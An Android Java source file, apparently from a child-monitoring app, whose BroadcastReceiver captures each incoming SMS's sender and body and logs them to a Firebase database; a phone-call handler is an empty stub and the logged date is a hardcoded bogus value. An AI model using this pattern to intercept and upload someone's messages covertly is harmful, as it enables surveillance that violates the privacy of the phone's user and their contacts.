package com.example.childapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;

import androidx.annotation.RequiresApi;

@RequiresApi(api = Build.VERSION_CODES.O)
public class MyBroadcastReceiver extends BroadcastReceiver {

    FirebaseDB myDB = new FirebaseDB();

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if(action.equals("android.provider.Telephony.SMS_RECEIVED")) {
            doSms(intent);
        }
        if(action.equals("android.intent.action.PHONE_STATE")) {
            doPhone(intent);
        }
    }

    private void doSms(Intent smsIntent) {
        Bundle bundle = smsIntent.getExtras(); // Get data from smsIntent
        SmsMessage[] Messages = null; // This will be used for combining more than one messages (if one message is too long)
        String smsSender;
        String smsBody;

        if(bundle != null) {
            try {
                Object[] pdus = (Object[])bundle.get("pdus");
                Messages = new SmsMessage[pdus.length]; // Allocate memory for pdus.length messages
                // For each message in Messages
                for(int i=0; i<Messages.length; i++) {
                    // Get bytes from pdus, message format, form the message info and assign it to Messages[i] using createFromPdu of SmsMessage class
                    Messages[i] = SmsMessage.createFromPdu((byte[])pdus[i], bundle.getString("format"));
                    // Get the sender from the message info we got using getDisplayOriginatingAddress method
                    smsSender = Messages[i].getDisplayOriginatingAddress();
                    // Get message body from the message info
                    smsBody = Messages[i].getMessageBody();

                    myDB.logSMS("25-06-1921", "Incoming", smsSender, smsBody);
                }
            }
            catch(Exception e) {
                System.out.println("*** Exception: " + e);
            }
        }
    }

    private void doPhone(Intent phoneIntent) {
        // Do phone stuff here
    }
}